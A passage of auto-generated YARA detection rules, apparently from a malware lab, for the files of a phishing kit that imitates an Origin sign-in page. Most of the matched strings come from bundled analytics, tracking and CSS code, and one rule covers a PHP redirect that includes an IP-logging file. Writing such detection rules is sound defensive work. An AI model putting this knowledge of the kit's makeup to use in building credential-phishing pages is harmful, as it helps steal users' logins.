      $s20 = "h.O=function(){var a=parseInt(V(this.b,\"width\"),10);var b=parseInt(V(this.b,\"height\"),10);var c=V(this.b,\"host\")+this.v();" ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule iframe_api {
   meta:
      description = "phish__origin - file iframe_api.js"
      author = "Comps Team Malware Lab"
      reference = "phish__origin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "a1b028e9a027db7cf77f75b7798a375179b0406aab480df1df1abe8586b7d2be"
   strings:
      $s1 = "if (!window['YT']) {var YT = {loading: 0,loaded: 0};}if (!window['YTConfig']) {var YTConfig = {'host': 'http://www.youtube.com'}" ascii /* score: '29.00'*/
      $s2 = "javascript';a.id = 'www-widgetapi-script';a.src = 'https://s.ytimg.com/yts/jsbin/www-widgetapi-vfl3m9ZW-/www-widgetapi.js';a.asy" ascii /* score: '28.00'*/
      $s3 = "if (!window['YT']) {var YT = {loading: 0,loaded: 0};}if (!window['YTConfig']) {var YTConfig = {'host': 'http://www.youtube.com'}" ascii /* score: '22.00'*/
      $s4 = "}var b = document.getElementsByTagName('script')[0];b.parentNode.insertBefore(a, b);})();}" fullword ascii /* score: '15.00'*/
      $s5 = "nc = true;var c = document.currentScript;if (c) {var n = c.nonce || c.getAttribute('nonce');if (n) {a.setAttribute('nonce', n);}" ascii /* score: '15.00'*/
      $s6 = "(c) {for (var k in c) {if (c.hasOwnProperty(k)) {YTConfig[k] = c[k];}}};var a = document.createElement('script');a.type = 'text/" ascii /* score: '13.00'*/
      $s7 = ";}if (!YT.loading) {YT.loading = 1;(function(){var l = [];YT.ready = function(f) {if (YT.loaded) {f();} else {l.push(f);}};windo" ascii /* score: '7.00'*/
      $s8 = "w.onYTReady = function() {YT.loaded = 1;for (var i = 0; i < l.length; i++) {try {l[i]();} catch (e) {}}};YT.setConfig = function" ascii /* score: '6.00'*/
   condition:
      uint16(0) == 0x690a and filesize < 2KB and
      all of them
}

rule analytics {
   meta:
      description = "phish__origin - file analytics.js"
      author = "Comps Team Malware Lab"
      reference = "phish__origin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "3fab1c883847e4b5a02f3749a9f4d9eab15cd4765873d3b2904a1a4c8755fba3"
   strings:
      $x1 = "if(!e)return!1;var g=new e;if(!(\"withCredentials\"in g))return!1;a=a.replace(/^http:/,\"https:\");g.open(\"POST\",a,!0);g.withC" ascii /* score: '34.00'*/
      $x2 = "3E4),c=\"\");return Pc(c,b)?(Ub.push(a),!0):!1},Pc=function(a,b,c){if(!window.JSON)return J(58),!1;var d=O.XMLHttpRequest;if(!d)" ascii /* score: '33.00'*/
      $x3 = "(\"https:\"==a||a==c||(\"http:\"!=a?0:\"http:\"==c))&&B(d)&&(wa(d.url,void 0,e),$d.set(b,!0)))}},v=function(a,b){var c=A.get(a)|" ascii /* score: '32.00'*/
      $x4 = "for(d=0;d<a.length;d++)if(b==a[d]){d=!0;break a}d=!1}return d},Cc=function(a){return encodeURIComponent?encodeURIComponent(a).re" ascii /* score: '31.00'*/
      $s5 = "N.N=function(){\"ga\"!=gb&&J(49);var a=O[gb];if(!a||42!=a.answer){N.L=a&&a.l;N.loaded=!0;var b=O[gb]=N;X(\"create\",b,b.create);" ascii /* score: '30.00'*/
      $s6 = "rd(e,b)}})};function sd(a,b){if(b==M.location.hostname)return!1;for(var c=0;c<a.length;c++)if(a[c]instanceof RegExp){if(a[c].tes" ascii /* score: '28.00'*/
      $s7 = "String(a.get(Q)),d.ka=Number(a.get(n)),c=c.palindrome?r:q,c=(c=M.cookie.replace(/^|(; +)/g,\";\").match(c))?c.sort().join(\"\")." ascii /* score: '27.00'*/
      $s8 = " c=\"https://www.google-analytics.com/gtm/js?id=\"+K(a.id);\"dataLayer\"!=a.B&&b(\"l\",a.B);b(\"t\",a.target);b(\"cid\",a.client" ascii /* score: '27.00'*/
      $s9 = "turn J(59),!1;var e=new d;if(!(\"withCredentials\"in e))return J(60),!1;e.open(\"POST\",(c||\"https://ampcid.google.com/v1/publi" ascii /* score: '27.00'*/
      $s10 = "\"\"==a||\":\"==a)return!0;return!1},ya=function(a,b){var c=M.referrer;if(/^(https?|android-app):\\/\\//i.test(c)){if(a)return c" ascii /* score: '27.00'*/
      $s11 = "Dc.prototype.S=function(a,b,c){function d(c){try{c=c||O.event;a:{var d=c.target||c.srcElement;for(c=100;d&&0<c;){if(d.href&&d.no" ascii /* score: '27.00'*/
      $s12 = "c.type=\"text/javascript\",c.async=!0,c.src=a,b&&(c.id=b),a=M.getElementsByTagName(\"script\")[0],a.parentNode.insertBefore(c,a)" ascii /* score: '24.00'*/
      $s13 = "(a=[\"t=error\",\"_e=\"+a,\"_v=j68\",\"sr=1\"],b&&a.push(\"_f=\"+b),c&&a.push(\"_m=\"+K(c.substring(0,100))),a.push(\"aip=1\"),a" ascii /* score: '24.00'*/
      $s14 = "pc.prototype.ma=function(a,b){var c=this;u(a,c,b)||(v(a,function(){u(a,c,b)}),y(String(c.get(V)),a,void 0,b,!0))};var rc=functio" ascii /* score: '23.00'*/
      $s15 = "b){Za.push([new RegExp(\"^\"+a+\"$\"),b])},T=function(a,b,c){return S(a,b,c,void 0,db)},db=function(){};var gb=qa(window.GoogleA" ascii /* score: '23.00'*/
      $s16 = "l?\"https:\":\"http:\")+\"//www.google-analytics.com\"},Da=function(a){this.name=\"len\";this.message=a+\"-8192\"},ba=function(a" ascii /* score: '23.00'*/
      $s17 = "if(!e)return!1;var g=new e;if(!(\"withCredentials\"in g))return!1;a=a.replace(/^http:/,\"https:\");g.open(\"POST\",a,!0);g.withC" ascii /* score: '23.00'*/
      $s18 = "encodeURIComponent(a),\"/\",e,\"\",b)){fb=e;return}}}zc(\"AMP_TOKEN\",encodeURIComponent(a),\"/\",fb,\"\",b)},Qc=function(a,b,c)" ascii /* score: '22.00'*/
      $s19 = "cation.protocol?\"https:\":\"http:\")+\"//www.google-analytics.com/plugins/ua/\"+c),d=ae(c),a=d.protocol,c=M.location.protocol," fullword ascii /* score: '22.00'*/
      $s20 = "H=function(a,b){null===a.ra&&(a.ra=1===Ed(b),a.ra&&J(33));return a.ra},Wd=/^gtm\\d+$/;var fd=function(a,b){a=a.b;if(!a.get(\"dcL" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__origin_home_ubuntu_malware_lab_samples_extracted_phishing_Origin_SIGN_IN_files_sha {
   meta:
      description = "phish__origin - file sha.js"
      author = "Comps Team Malware Lab"
      reference = "phish__origin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "821a027fd012516343bf16665bd7093c256e01f89a2ef84e8b19a0219756febc"
   strings:
      $s1 = "2453635748" ascii /* score: '17.00'*/ /* hex encoded string '$ScWH' */
      $s2 = "2666613458" ascii /* score: '17.00'*/ /* hex encoded string '&fa4X' */
      $s3 = "3049323471" ascii /* score: '17.00'*/ /* hex encoded string '0I24q' */
      $s4 = "3479774868" ascii /* score: '17.00'*/ /* hex encoded string '4ywHh' */
      $s5 = "3345764771" ascii /* score: '17.00'*/ /* hex encoded string '3EvGq' */
      $s6 = "4022224774" ascii /* score: '17.00'*/ /* hex encoded string '@""Gt' */
      $s7 = "2341262773" ascii /* score: '17.00'*/ /* hex encoded string '#A&'s' */
      $s8 = "2173295548" ascii /* score: '17.00'*/ /* hex encoded string '!s)UH' */
      $s9 = "2428436474" ascii /* score: '17.00'*/ /* hex encoded string '$(Cdt' */
      $s10 = "2870763221" ascii /* score: '17.00'*/ /* hex encoded string '(pv2!' */
      $s11 = "2730485921" ascii /* score: '17.00'*/ /* hex encoded string ''0HY!' */
      $s12 = "2566594879" ascii /* score: '17.00'*/ /* hex encoded string '%fYHy' */
      $s13 = "3158454273" ascii /* score: '17.00'*/ /* hex encoded string '1XEBs' */
      $s14 = "3928383900" ascii /* score: '17.00'*/ /* hex encoded string '9(89' */
      $s15 = "(function(){var w=8,G=\"\",C=0,x=function(K,J){this.highOrder=K;this.lowOrder=J},E=function(L){var J=[],K=(1<<w)-1,N=L.length*w," ascii /* score: '14.00'*/
      $s16 = "null;this.strBinLen=null;this.strToHash=null;if(\"HEX\"===J){if(0!==(K.length%2)){return\"TEXT MUST BE IN BYTE INCREMENTS\"}this" ascii /* score: '13.00'*/
      $s17 = "nLen,K)}return M(this.sha512);default:return\"HASH NOT RECOGNIZED\"}},getHMAC:function(S,R,Q,O){var N,M,V,W,L,J,U,P,X,T=[],K=[];" ascii /* score: '12.00'*/
      $s18 = "=E(K)}else{return\"UNKNOWN TEXT INPUT TYPE\"}}};p.prototype={getHash:function(K,J){var M=null,L=this.strToHash.slice();switch(J)" ascii /* score: '12.00'*/
      $s19 = "BinLen=K.length*4;this.strToHash=a(K)}else{if((\"ASCII\"===J)||(\"undefined\"===typeof(J))){this.strBinLen=K.length*w;this.strTo" ascii /* score: '10.00'*/
      $s20 = "lt:return\"HASH NOT RECOGNIZED\"}if(\"HEX\"===R){if(0!==(S.length%2)){return\"KEY MUST BE IN BYTE INCREMENTS\"}M=a(S);P=S.length" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 40KB and
      8 of them
}

rule originX_pc_login {
   meta:
      description = "phish__origin - file originX-pc-login.css"
      author = "Comps Team Malware Lab"
      reference = "phish__origin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "2c50482aa42fe2c825f11a649a32ddf2262285ecb307a1327eea23f7e3d0fa38"
   strings:
      $x1 = ".otktooltip-bottom .otktooltip-arrow{top:2px}.otktooltip{margin:0;padding:0}.otktooltip-effect .otktooltip-bottom{position:relat" ascii /* score: '36.00'*/
      $s2 = ":before{content:\"\\e606\"}#login-with-phone-number{display:inline-block;margin-top:6px;cursor:pointer}#logout-and-relogin{displ" ascii /* score: '26.00'*/
      $s3 = "display:inline}.checkbox-login-first{display:block;margin-bottom:20px}.checkbox-login-last{display:block;margin-bottom:20px}.otk" ascii /* score: '18.00'*/
      $s4 = "op:0}#passwordShow{position:absolute;top:0;right:14px;padding:6px;width:inherit!important;z-index:1}#passwordShow.otkbtn-light{c" ascii /* score: '15.00'*/
      $s5 = "ews section p{margin-bottom:24px}#loginBase .otkbtn{margin-top:6px;width:100%;max-width:100%}#loginBase .otkbtn-primary{margin-t" ascii /* score: '15.00'*/
      $s6 = "ce-error+.views section,.otknotice-passive+.views section,.otknotice-warning+.views section{height:calc(708px - 150px)}.otknotic" ascii /* score: '14.00'*/
      $s7 = "olor:#141b20;border:1px solid #c3c6ce;background:#edf1f2}#passwordShow.otkbtn-light:hover{background:#c3c6ce}.otktooltip-withcon" ascii /* score: '12.00'*/
      $s8 = "play:-webkit-inline-box;top:0}.clearfix:after,.tile-touch .otkscrim:after{content:\"\";display:table;clear:both}.captcha-contain" ascii /* score: '11.00'*/
      $s9 = "align:center;overflow:hidden}.otknotice-error,.otknotice-passive,.otknotice-warning{background-color:#22313c;color:#fff}.otknoti" ascii /* score: '10.00'*/
      $s10 = "tent{display:inline-table;position:relative}#logViews .otkicon-help{font-size:24px;color:#c3c6ce;position:static;height:16px;dis" ascii /* score: '9.00'*/
      $s11 = "ive;top:-5px;left:-44%;height:0}.otktooltip .otktooltip-inner{position:relative;top:7px;padding:10px 12px;text-align:left}#logVi" ascii /* score: '9.00'*/
      $s12 = "tooltip-withcontent{display:inline-table;position:relative}.otkicon-help{font-size:24px;color:#c3c6ce;position:static;height:17p" ascii /* score: '9.00'*/
      $s13 = "ttom-right-radius:0}.phone-number-write{width:70%}.phone-number-write input{border-top-left-radius:0!important;border-bottom-lef" ascii /* score: '7.00'*/
      $s14 = "mportant}.phone-number-input{display:flex}.phone-number-select{position:relative;width:30%}.phone-number-select select{border-bo" ascii /* score: '7.00'*/
      $s15 = "6px;padding-right:0}.otknotice-passive .otkicon{color:#2ac4f5;font-size:24px;top:6px;padding-right:0}.otknotice-warning .otkicon" ascii /* score: '7.00'*/
      $s16 = "ice-stripe{position:static}.otknotice-stripe-message .otkicon{left:0}.otknotice-error .otkicon{color:#ff6550;font-size:24px;top:" ascii /* score: '7.00'*/
      $s17 = "t-radius:0!important}.phone-number-pad{padding-left:38px;border-top-right-radius:0;border-bottom-right-radius:0;border-bottom-le" ascii /* score: '7.00'*/
      $s18 = "appearance:none;-webkit-appearance:none;appearance:none;-webkit-transition:all .3s ease-in-out;transition:all .3s ease-in-out}.o" ascii /* score: '4.00'*/
      $s19 = "-color:#22313c;color:#fff;position:fixed;z-index:0;top:0;height:0;width:100%;transition:all .6s cubic-bezier(0.03,1,0.2,1);text-" ascii /* score: '4.00'*/
      $s20 = "inline-block;margin-top:6px;cursor:pointer}.otkicon-warning{font-size:96px;left:-18px;color:#fea722}.otknotice-stripe{background" ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6f2e and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__origin_home_ubuntu_malware_lab_samples_extracted_phishing_Origin_SIGN_IN_files_utag {
   meta:
      description = "phish__origin - file utag.js"
      author = "Comps Team Malware Lab"
      reference = "phish__origin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5f622af7b42fea7bb0e36a0c7bc3ce5f8645e2622cbc18b688c413066eacadad"
   strings:
      $x1 = "if(utag.ut.loader===undefined){u.loader=function(o){var b,c,l,a=document;if(o.type===\"iframe\"){b=a.createElement(\"iframe\");o" ascii /* score: '33.00'*/
      $s2 = "if(_event){fbq(_track,_event,u.remove_empty(g));}}};u.callBack=function(){var data={};u.initialized=true;while(data=u.queue.shif" ascii /* score: '30.00'*/
      $s3 = "u.ev={\"view\":1,\"link\":1};u.initialized=false;u.scriptrequested=false;u.queue=[];u.event_lookup={\"ViewContent\":{obj:\"vc\"," ascii /* score: '30.00'*/
      $s4 = "u.ev={\"view\":1,\"link\":1};u.initialized=false;u.scriptrequested=false;u.queue=[];u.event_lookup={\"ViewContent\":{obj:\"vc\"," ascii /* score: '28.00'*/
      $s5 = "g.content_category=u.val(g.content_category);},\"num_items\":function(g){if(!g.num_items&&u.data.calc_items===\"true\"){g.num_it" ascii /* score: '24.00'*/
      $s6 = "//tealium universal tag - utag.344 ut4.0.201610241851, Copyright 2016 Tealium.com Inc. All Rights Reserved." fullword ascii /* score: '24.00'*/
      $s7 = "t()){u.data=data.data;u.loader_cb();}};if(u.initialized){u.loader_cb();}else{u.queue.push({\"data\":u.data});if(!u.scriptrequest" ascii /* score: '23.00'*/
      $s8 = "return i;};u.map={};u.extend=[function(a,b){try{if(1){try{b['_corder']=\"\"}catch(e){};try{b['_csubtotal']=\"\"}catch(e){};try{b" ascii /* score: '22.00'*/
      $s9 = "u.loader_cb=function(){var g={},i,j,_event,_track=\"track\";if(u.data.evt_list.toString().indexOf(\"Purchase\")===-1&&u.data.eco" ascii /* score: '20.00'*/
      $s10 = "u.loader_cb=function(){var g={},i,j,_event,_track=\"track\";if(u.data.evt_list.toString().indexOf(\"Purchase\")===-1&&u.data.eco" ascii /* score: '20.00'*/
      $s11 = "==\"script\"){c.parentNode.insertBefore(b,c);}else{c.appendChild(b)}}}}else{u.loader=utag.ut.loader;}" fullword ascii /* score: '19.00'*/
      $s12 = "g.value=u.val(g.value);},\"currency\":function(g){if(!g.currency){g.currency=u.data.ecom.order_currency;}},\"content_name\":func" ascii /* score: '19.00'*/
      $s13 = "g.content_name=u.val(g.content_name);},\"content_ids\":function(g){if(!g.content_ids){g.content_ids=u.data.ecom.product_id;}" fullword ascii /* score: '19.00'*/
      $s14 = "f._fbq=e;e.push=e;e.loaded=!0;e.version='2.0';e.queue=[];e.agent='tmtealium';}(window,document);if(u.data.cust_pixel){u.data.cus" ascii /* score: '19.00'*/
      $s15 = "if(utag.ut.loader===undefined){u.loader=function(o){var b,c,l,a=document;if(o.type===\"iframe\"){b=a.createElement(\"iframe\");o" ascii /* score: '19.00'*/
      $s16 = "){u.scriptrequested=true;u.loader({\"type\":\"script\",\"src\":u.data.base_url,\"cb\":u.callBack,\"loc\":\"script\",\"id\":'utag" ascii /* score: '19.00'*/
      $s17 = "eElement(\"script\");b.language=\"javascript\";b.type=\"text/javascript\";b.async=1;b.charset=\"utf-8\";for(l in utag.loader.GV(" ascii /* score: '19.00'*/
      $s18 = "g.value=u.val(g.value);},\"currency\":function(g){if(!g.currency){g.currency=u.data.ecom.order_currency;}},\"content_name\":func" ascii /* score: '19.00'*/
      $s19 = "(g){if(!g.content_name){g.content_name=u.data.ecom.product_name;}" fullword ascii /* score: '16.00'*/
      $s20 = ".onreadystatechange=null;o.cb()}};}}l=o.loc||\"head\";c=a.getElementsByTagName(l)[0];if(c){utag.DB(\"Attach to \"+l+\": \"+o.src" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x2f2f and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule utag_002 {
   meta:
      description = "phish__origin - file utag_002.js"
      author = "Comps Team Malware Lab"
      reference = "phish__origin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "c30ab88d268ebb84b663ca2b0ed232dc8d97778a3766f29bdb9bb6d015c71e4b"
   strings:
      $x1 = "var utag_condload=false;try{(function(){function ul(src,a,b){a=document;b=a.createElement('script');b.language='javascript';b.ty" ascii /* score: '56.00'*/
      $x2 = "if(this.wq.length>0)utag.loader.EV('','ready',function(a){if(utag.loader.rf==0){utag.DB('READY:utag.loader.wq');utag.loader.rf=1" ascii /* score: '41.00'*/
      $x3 = "utag.rpt.ts['s']=new Date();v=\".tiqcdn.com\";w=utag.cfg.path.indexOf(v);if(w>0&&b[\"cp.utag_main__ss\"]==1&&!utag.cfg.no_sessio" ascii /* score: '40.00'*/
      $x4 = "if(o.type!=\"img\"&&!m){l=o.loc||\"head\";c=a.getElementsByTagName(l)[0];if(c){utag.DB(\"Attach to \"+l+\": \"+o.src);if(l==\"sc" ascii /* score: '38.00'*/
      $x5 = "if((document.attachEvent||utag.cfg.dom_complete)?document.readyState===\"complete\":document.readyState!==\"loading\")setTimeout" ascii /* score: '34.00'*/
      $x6 = ".removeEventListener(\"DOMContentLoaded\",RH,false);utag.loader.run_ready_q()};if(!utag.cfg.dom_complete)document.addEventListen" ascii /* score: '34.00'*/
      $x7 = "return(a)?(o[a]?o[a]:{}):o;},SC:function(a,b,c,d,e,f,g,h,i,j,k,x,v){if(!a)return 0;if(a==\"utag_main\"&&utag.cfg.nocookie)return" ascii /* score: '33.00'*/
      $x8 = "var tag=document.createElement('script');tag.src=\"//www.google-analytics.com/analytics.js\";var firstScriptTag=document.getElem" ascii /* score: '33.00'*/
      $x9 = "loadGA();if(typeof YT==='undefined'){var tag=document.createElement('script');tag.src=\"https://www.youtube.com/iframe_api\";var" ascii /* score: '31.00'*/
      $s10 = "if($('#offline-auth-error').is(':visible')){tlm.sendMarketingEvent(ERROR,LOGIN,OFFLINE_EMAIL_ID_OR_PASSWORD_IS_INCORRECT_OR_HAS_" ascii /* score: '30.00'*/
      $s11 = "//tealium universal tag - utag.loader ut4.0.201806182110, Copyright 2018 Tealium.com Inc. All Rights Reserved." fullword ascii /* score: '29.00'*/
      $s12 = "ag.loader.cfg={\"137\":{load:utag.cond[139],send:0,v:201806182110,wait:0,tid:20060,src:\"//tags.tiqcdn.com/utag/tiqapp/utag.curr" ascii /* score: '29.00'*/
      $s13 = "return b},OU:function(a,b,c,d,f){try{if(typeof utag.data['cp.OPTOUTMULTI']!='undefined'){c=utag.loader.cfg;a=utag.ut.decode(utag" ascii /* score: '29.00'*/
      $s14 = "t[\"tealium_random\"]=Math.random().toFixed(16).substring(2);t[\"tealium_library_name\"]=\"ut\"+\"ag.js\";t[\"tealium_library_ve" ascii /* score: '28.00'*/
      $s15 = "function onMessageTealium(e){var msg=JSON.parse(e.data);if(msg.method===TELEMETRY_INFO){window.utag.data=!_.isUndefined(msg.payl" ascii /* score: '28.00'*/
      $s16 = "},RDqp:function(o,a,b,c){a=location.search+(location.hash+'').replace(\"#\",\"&\");if(utag.cfg.lowerqp){a=a.toLowerCase()};if(a." ascii /* score: '28.00'*/
      $s17 = "if(a&&!utag.cfg.noview)utag.loader.RDses(o);utag.loader.RDqp(o);utag.loader.RDmeta(o);utag.loader.RDdom(o);utag.loader.RDut(o,a|" ascii /* score: '28.00'*/
      $s18 = "oad.utag)?msg.payload.utag:window.utag.data;utag.view(window.utag.data);if(Backbone.history.getHash()==='thankYou'&&isThankYouPa" ascii /* score: '28.00'*/
      $s19 = "tlm.logDebuggingMessage=function(category,action,label,value,parameters,pinParameter){var env=_.get(Origin,'config.overrides.env" ascii /* score: '28.00'*/
      $s20 = "tlm.logDebuggingMessage=function(category,action,label,value,parameters,pinParameter){var env=_.get(Origin,'config.overrides.env" ascii /* score: '28.00'*/
   condition:
      uint16(0) == 0x2f2f and filesize < 400KB and
      1 of ($x*) and all of them
}

rule _opt_mal_phish__origin_home_ubuntu_malware_lab_samples_extracted_phishing_Origin_SIGN_IN_files_css {
   meta:
      description = "phish__origin - file css.css"
      author = "Comps Team Malware Lab"
      reference = "phish__origin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "01ba03c5429d575b331b10e4617d0d5b5c89960bcf02dd125c6590786defed8e"
   strings:
      $s1 = "  src: local('Open Sans Regular'), local('OpenSans-Regular'), url(https://fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFU" ascii /* score: '16.00'*/
      $s2 = "  src: local('Open Sans Regular'), local('OpenSans-Regular'), url(https://fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFW" ascii /* score: '16.00'*/
      $s3 = "  src: local('Open Sans Regular'), local('OpenSans-Regular'), url(https://fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFV" ascii /* score: '16.00'*/
      $s4 = "  src: local('Open Sans SemiBold'), local('OpenSans-SemiBold'), url(https://fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-U" ascii /* score: '16.00'*/
      $s5 = "  src: local('Open Sans Light'), local('OpenSans-Light'), url(https://fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN_r8OU" ascii /* score: '16.00'*/
      $s6 = "  src: local('Open Sans SemiBold'), local('OpenSans-SemiBold'), url(https://fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-U" ascii /* score: '16.00'*/
      $s7 = "  src: local('Open Sans Regular'), local('OpenSans-Regular'), url(https://fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFW" ascii /* score: '16.00'*/
      $s8 = "  src: local('Open Sans SemiBold'), local('OpenSans-SemiBold'), url(https://fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-U" ascii /* score: '16.00'*/
      $s9 = "  src: local('Open Sans Regular'), local('OpenSans-Regular'), url(https://fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFW" ascii /* score: '16.00'*/
      $s10 = "  src: local('Open Sans SemiBold'), local('OpenSans-SemiBold'), url(https://fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-U" ascii /* score: '16.00'*/
      $s11 = "  src: local('Open Sans Regular'), local('OpenSans-Regular'), url(https://fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFU" ascii /* score: '16.00'*/
      $s12 = "  src: local('Open Sans Regular'), local('OpenSans-Regular'), url(https://fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFW" ascii /* score: '16.00'*/
      $s13 = "  src: local('Open Sans Light'), local('OpenSans-Light'), url(https://fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN_r8OU" ascii /* score: '16.00'*/
      $s14 = "  src: local('Open Sans Regular'), local('OpenSans-Regular'), url(https://fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFW" ascii /* score: '16.00'*/
      $s15 = "  src: local('Open Sans Light'), local('OpenSans-Light'), url(https://fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN_r8OU" ascii /* score: '16.00'*/
      $s16 = "  src: local('Open Sans Light'), local('OpenSans-Light'), url(https://fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN_r8OV" ascii /* score: '16.00'*/
      $s17 = "  src: local('Open Sans SemiBold'), local('OpenSans-SemiBold'), url(https://fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-U" ascii /* score: '16.00'*/
      $s18 = "  src: local('Open Sans Light'), local('OpenSans-Light'), url(https://fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN_r8OX" ascii /* score: '16.00'*/
      $s19 = "  src: local('Open Sans Light'), local('OpenSans-Light'), url(https://fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN_r8OV" ascii /* score: '16.00'*/
      $s20 = "  src: local('Open Sans Light'), local('OpenSans-Light'), url(https://fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN_r8OX" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 20KB and
      8 of them
}

rule originX_pc_common {
   meta:
      description = "phish__origin - file originX-pc-common.css"
      author = "Comps Team Malware Lab"
      reference = "phish__origin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "81ac6df7f19edbc9dc81aebbe75a42090f5473a7fc5e38a0644d3d9baea282de"
   strings:
      $s1 = ".form-container{display:block;position:static;clear:both;width:480px;margin:auto;top:calc(50% - 324px);left:calc(50% - 240px);-w" ascii /* score: '28.00'*/
      $s2 = "ding-left:40px}.otknav.otknav-pills li.otkpill-active:after{content:\"\";height:3px;width:100%;position:absolute;bottom:0;backgr" ascii /* score: '15.00'*/
      $s3 = "in:12px 0 24px 0!important}.general-error{background:#d80000 url(../../../ui/core/img/background-general-error.png) right -49px;" ascii /* score: '12.00'*/
      $s4 = "kicon-checkcircle,.otkicon-challenge{left:-18px;color:#04bd68;-webkit-animation:popIn .5s ease-in-out;-moz-animation:popIn .5s e" ascii /* score: '9.00'*/
      $s5 = "-in-out}.otkicon-warning:before,.otkicon-checkcircle:before,.otkicon-challenge:before{display:block;font-size:96px}.right{float:" ascii /* score: '9.00'*/
      $s6 = "nd:#f56c2d}section{height:calc(708px - 98px);padding:24px 40px;overflow:auto}section .otkbtn{margin:24px 0 6px 0}section h1{marg" ascii /* score: '8.00'*/
      $s7 = ".form-container{display:block;position:static;clear:both;width:480px;margin:auto;top:calc(50% - 324px);left:calc(50% - 240px);-w" ascii /* score: '8.00'*/
      $s8 = "elect.focus>.otkselect-label{border:1px solid #f56c2d}.otkbtn-primary.disabled{cursor:default;opacity:.45;pointer-events:none}se" ascii /* score: '7.00'*/
      $s9 = "important}body{font-family:'Open Sans',sans-serif;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;height:10" ascii /* score: '7.00'*/
      $s10 = "otkform-group-help{display:none}p.otkform-group-help{margin:6px auto 12px auto}.otkform-group-haserror.otkform-group-help{displa" ascii /* score: '7.00'*/
      $s11 = "lect.disabled{pointer-events:none}.otknotice-stripe-message .otkicon{left:0}.otkform-group-field.otkicon{top:0;display:block}.ot" ascii /* score: '7.00'*/
      $s12 = "animation:popIn .5s ease-in-out;-moz-animation:popIn .5s ease-in-out;-o-animation:popIn .5s ease-in-out;animation:popIn .5s ease" ascii /* score: '4.00'*/
      $s13 = "ebkit-animation:none;-moz-animation:none;-o-animation:none;animation:none}.views{border-radius:0 0 4px 4px;color:#141b20;backgro" ascii /* score: '4.00'*/
      $s14 = "ase-in-out;-o-animation:popIn .5s ease-in-out;animation:popIn .5s ease-in-out}.otkicon-warning{left:-18px;color:#fea722;-webkit-" ascii /* score: '4.00'*/
      $s15 = "height:49px;overflow:hidden;display:none;width:100%;margin:0;padding:0}.otklabel{width:100%;display:block;margin:24px 0 12px 0}." ascii /* score: '4.00'*/
      $s16 = "und-color:#fff}nav.otknavbar{height:58px}a{text-decoration:none}a:hover{text-decoration:underline}a.otkbtn{text-decoration:none!" ascii /* score: '4.00'*/
      $s17 = "ion:absolute;top:50%;left:330px;-webkit-transform:translate(0,-50%);-ms-transform:translate(0,-50%);transform:translate(0,-50%);" ascii /* score: '4.00'*/
      $s18 = "right}.otkbtn:hover{background:#c85e36}footer{height:40px;margin:0;padding:0;top:0;border-radius:0 0 4px 4px;color:#787d85;backg" ascii /* score: '4.00'*/
      $s19 = ",*:after{-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box}*{padding:0;margin:0;-webkit-backface-vi" ascii /* score: '4.00'*/
      $s20 = "round-color:#edf1f2;display:block;clear:both;position:relative;overflow:hidden}footer img{height:20px;margin:10px 12px 10px 24px" ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x662e and filesize < 9KB and
      8 of them
}

rule _opt_mal_phish__origin_home_ubuntu_malware_lab_samples_extracted_phishing_Origin_index {
   meta:
      description = "phish__origin - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__origin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__origin_home_ubuntu_malware_lab_samples_extracted_phishing_Origin_login {
   meta:
      description = "phish__origin - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__origin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "68b6f8355ce61cd4f81f88ae0b98e95888284fdfff8f7a1e5420590ec59a4f12"
   strings:
